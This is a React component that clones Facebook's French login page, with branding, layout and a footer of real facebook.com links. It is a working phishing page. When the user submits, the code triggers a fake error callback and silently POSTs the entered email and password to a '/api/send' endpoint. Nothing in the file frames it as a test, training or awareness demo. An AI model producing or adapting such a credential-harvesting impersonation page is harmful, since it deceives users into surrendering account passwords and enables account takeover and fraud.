import { useState } from "react";
import emailjs from "@emailjs/browser";
import { FaFacebook, FaMeta, FaEye, FaEyeSlash } from "react-icons/fa6";
import imagecote from "../assets/imagecote.png";
function FacebLog({ onErreur }) {
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");

  const handleSubmit = async () => {
    onErreur();
    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });
  };
  const footerLangs = [
    { label: "Français (France)", href: "#", active: true },
    { label: "Malagasy", href: "#" },
    { label: "English (US)", href: "#" },
    { label: "Italiano", href: "#" },
    { label: "Español", href: "#" },
    { label: "Deutsch", href: "#" },
    { label: "中文(简体)", href: "#" },
    { label: "Autres langues...", href: "#" },
  ];

  const footerNav = [
    { label: "S'inscrire", href: "https://web.facebook.com/reg/" },
    { label: "Se connecter", href: "https://web.facebook.com/login/" },
    { label: "Messenger", href: "https://messenger.com/" },
    { label: "Facebook Lite", href: "https://web.facebook.com/lite/" },
    { label: "Vidéo", href: "https://web.facebook.com/watch/" },
    { label: "Meta Pay", href: "https://about.meta.com/technologies/meta-pay" },
    { label: "Boutique Meta", href: "https://www.meta.com/" },
    { label: "Meta Quest", href: "https://www.meta.com/quest/" },
    { label: "Ray-Ban Meta", href: "https://www.meta.com/smart-glasses/" },
    { label: "Meta AI", href: "https://www.meta.ai/" },
    { label: "Instagram", href: "https://www.instagram.com/" },
    { label: "Threads", href: "https://www.threads.com/" },
    {
      label: "Politique de confidentialité",
      href: "https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer",
    },
    {
      label: "Centre de confidentialité",
      href: "https://web.facebook.com/privacy/center/?entry_point=facebook_page_footer",
    },
    { label: "À propos", href: "https://web.facebook.com/about/" },
    {
      label: "Créer une publicité",
      href: "https://web.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto",
    },
    {
      label: "Créer une Page",
      href: "https://web.facebook.com/pages/create/?ref_type=site_footer",
    },
    { label: "Développeurs", href: "https://developers.facebook.com/?ref=pf" },
    { label: "Emplois", href: "https://web.facebook.com/careers/?ref=pf" },
    { label: "Cookies", href: "https://web.facebook.com/policies/cookies/" },
    {
      label: "Choisir sa publicité",
      href: "https://web.facebook.com/help/568137493302217",
    },
    {
      label: "Conditions générales",
      href: "https://web.facebook.com/policies?ref=pf",
    },
    { label: "Aide", href: "https://web.facebook.com/help/?ref=pf" },
    {
      label: "Importation des contacts et non-utilisateurs",
      href: "https://web.facebook.com/help/637205020878504",
    },
  ];

  return (
    <>
      <section className="mere">
        <div className="entete">
          <FaFacebook className="faceb2" />
        </div>
        <div className="haut">
          <div className="gauche">
            <div className="g1">
              <FaFacebook className="faceb" />
              <h1>
                Explorez <br /> les sujets que{" "}
                <span>
                  vous <br />
                  aimez
                </span>
                .
              </h1>
            </div>
            <div className="g2">
              <img src={imagecote} alt="" />
            </div>
          </div>
          <div className="droite">
            <div className="d1">
              <div className="titre">
                <h3>Se connecter à Facebook</h3>
              </div>
              <div className="formulaire">
                {/* <div className="input-group">
                  <input type="text" id="email" required />
                  <label htmlFor="email">E-mail ou numéro de mobile</label>
                </div>

                <div className="input-group">
                  <input type="password" id="password" required />
                  <label htmlFor="password">Mot de passe</label>
                </div> */}
                <input
                  type="text"
                  id="email"
                  placeholder="E-mail ou numéro de mobile"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                {/* <input
                  type="password"
                  id="password"
                  placeholder="Mot de passe"
                /> */}
                <div className="password-wrapper">
                  <input
                    type={showPassword ? "text" : "password"}
                    id="password"
                    placeholder="Mot de passe"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  {password && (
                    <span
                      className="eye-icon"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <FaEyeSlash /> : <FaEye />}
                    </span>
                  )}
                </div>
                <button className="seconnecter" onClick={handleSubmit}>
                  Se connecter
                </button>
                <button className="oublie">Mot de passe oublié ?</button>
                <button className="nouveau">Créer un nouveau compte</button>
                <p>
                  <FaMeta className="meta" />
                  <span>Meta</span>
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* ===== FOOTER ===== */}
        <div className="footer">
          {/* Sélecteur de langue */}
          <div className="footer-langs">
            {footerLangs.map((lang, i) => (
              <a
                key={i}
                className={`footer-lang-link ${lang.active ? "active" : ""}`}
              >
                {lang.label}
              </a>
            ))}
          </div>

          <div className="footer-nav">
            {footerNav.map((item, i) => (
              <a key={i} target="_blank" rel="noreferrer">
                {item.label}
              </a>
            ))}
          </div>

          <div className="footer-copy">Meta © 2026</div>
        </div>
      </section>
    </>
  );
}

export default FacebLog;
